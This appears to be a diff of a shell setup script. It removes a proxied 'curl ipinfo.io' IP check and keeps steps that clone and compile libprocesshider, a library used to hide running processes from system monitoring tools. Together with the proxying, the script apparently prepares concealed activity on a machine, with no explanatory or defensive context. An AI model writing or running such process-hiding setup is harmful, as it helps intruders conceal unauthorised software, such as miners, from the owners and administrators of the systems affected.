@@ -22,18 +22,6 @@ sleep .2
 echo " "
 echo " "
 
-echo "******************************************************************"
-
-./graftcp/graftcp curl ipinfo.io
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-echo " "
-echo " "
-
 git clone https://github.com/hanifgz/libprocesshider.git
 cd libprocesshider;make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
